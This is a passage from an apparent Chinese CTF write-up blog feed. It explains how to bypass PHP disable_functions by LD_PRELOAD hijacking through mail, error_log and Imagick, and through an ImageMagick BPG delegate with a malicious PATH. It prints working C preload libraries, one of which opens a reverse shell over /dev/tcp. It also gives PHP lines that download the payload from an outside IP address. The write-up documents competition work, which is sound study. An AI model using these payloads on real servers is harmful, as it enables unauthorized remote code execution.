+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">gcc hack.c -fPIC -shared -o hack.so
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>php 文件中代码为&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">putenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;LD_PRELOAD=./hack.so&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">mail&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004080.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>可以看到已经执行了&lt;code>ls&lt;/code>命令并成功输出了&lt;code>hacked&lt;/code>，使用&lt;code>strace&lt;/code>看看我们可以发现执行顺序。&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008064.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>当然还有另一种劫持，直接选择一个函数进行劫持，例如我们通过&lt;code>strace php test.php&lt;/code>发现调用了&lt;code>geteuid()&lt;/code>以及&lt;code>getpid()&lt;/code>函数，我们可以在&lt;code>hack.c&lt;/code>中这么写&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define _GNU_SOURCE
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;signal.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ls&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;echo hacked!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">getpid&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unsetenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这样也可以完成劫持&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002758.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="getflag">GetFlag
+&lt;/h3>&lt;p>所以我们需要找到一个可以启动子进程的函数，以实现我们劫持函数做到 RCE 的目的，然后这里我本地调通了但是远程不知道怎么没打通&amp;hellip;&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009740.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>这里我直接用&lt;code>new&lt;/code>了一个&lt;code>.jpg&lt;/code>也可以调用子进程，但是服务器却没有触发&amp;hellip;&lt;/p>
+&lt;p>然后最好还是按照飘零师傅的&lt;a class="link" href="https://www.anquanke.com/post/id/175403#h2-6" target="_blank" rel="noopener"
+>深入浅出LD_PRELOAD &amp;amp; putenv()&lt;/a>用&lt;code>wmv&lt;/code>进行了 hook ，最后成功 RCE。&lt;/p>
+&lt;p>这里的原理就是因为&lt;code>Imagick&lt;/code>在处理&lt;code>wmv&lt;/code>格式的文件会起一个子进程来处理，所以就达到了我们的目的。还有很多格式的文件都可以，可以参考 ctftime 上该题的其他 wp。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define _GNU_SOURCE
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;signal.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;bash -c &lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">sh &amp;gt;&amp;amp; /dev/tcp/your_ip/port 0&amp;gt;&amp;amp;1&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">daemonize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">signal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SIGHUP&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SIG_IGN&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">fork&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">__attribute__&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">__constructor__&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">preloadme&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unsetenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">daemonize&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>至于怎么传文件到服务器上，有很多种方法，比如&lt;code>file_put_contents()&lt;/code>，也可以用如下的方式&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">copy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://106.14.153.173:8080/hack.wmv&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;/tmp/3b1412753f475cc969c37231dd6eaea2/hack.wmv&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">copy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://106.14.153.173:8080/hack.so&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;/tmp/3b1412753f475cc969c37231dd6eaea2/hack.so&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="the-other-way">The other way
+&lt;/h3>&lt;p>也可以利用&lt;a class="link" href="https://www.php.net/manual/zh/function.error-log.php" target="_blank" rel="noopener"
+>error_log&lt;/a>这个方法，这个方法也开启了子进程调用了&lt;code>sendmail&lt;/code>方法。按照之前的思路进行就可以了&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007064.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="参考">参考
+&lt;/h3>&lt;p>&lt;a class="link" href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener"
+>无需sendmail：巧用LD_PRELOAD突破disable_functions&lt;/a>&lt;/p>
+&lt;h2 id="the-second-way-to-hack">The second way to Hack
+&lt;/h2>&lt;p>这里也主要是用了&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;delegate&lt;/span> &lt;span class="na">decode=&lt;/span>&lt;span class="s">&amp;#34;bpg&amp;#34;&lt;/span> &lt;span class="na">command=&lt;/span>&lt;span class="s">&amp;#34;&amp;amp;quot;@BPGDecodeDelegate@&amp;amp;quot; -b 16 -o &amp;amp;quot;%o.png&amp;amp;quot; &amp;amp;quot;%i&amp;amp;quot;; @MVDelegate@ &amp;amp;quot;%o.png&amp;amp;quot; &amp;amp;quot;%o&amp;amp;quot;&amp;#34;&lt;/span>&lt;span class="nt">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">//&amp;#34;@BPGDecodeDelegate@&amp;#34; -b 16 -o &amp;#34;%o.png&amp;#34; &amp;#34;%i&amp;#34;; @MVDelegate@ &amp;#34;%o.png&amp;#34; &amp;#34;%o&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里参考了其他师傅的 wp ，主要是利用了&lt;code>@BPGDecodeDelegate&lt;/code>对于后缀&lt;code>.bpg&lt;/code>的解析，它会去 PATH 中寻找相关的&lt;code>bpgenc&lt;/code>文件&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009100.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>所以我们只需要设置一个恶意的 PATH ，并在这个文件夹下放入我们的可执行文件。&lt;/p>
+&lt;p>只要找到函数要执行的文件我们就可以进行操作了。例如下面用了&lt;code>Imagick-&amp;gt;readImage()&lt;/code>的方法&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002391.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;h1 id="conclusion">Conclusion
+&lt;/h1>&lt;p>这次比赛还是玩的比较有收获的，至少给我打发了周末等面试结果的煎熬时光2333…第一题自己想法是通过 karaf.shell 去做，然而并没有找到突破点，还是跟另一个师傅弄了 karaf.config 的 install 方法去做的。菜还是菜，并没有去发掘文档深入的点。第二题在比赛中因为没什么时间了，就没怎么去看了。赛后复现觉得自己对 php 底层了解的很少，打算这段时间可以去往这方面发掘一下。也还有关于第二题解法二的发掘点还存在一定的疑惑，可能就是从 fuzz bpg 格式开始寻找到的突破点吧。还看到了另一个关于题二的解法，等会还可以研究下一下。&lt;/p></description></item></channel></rss>
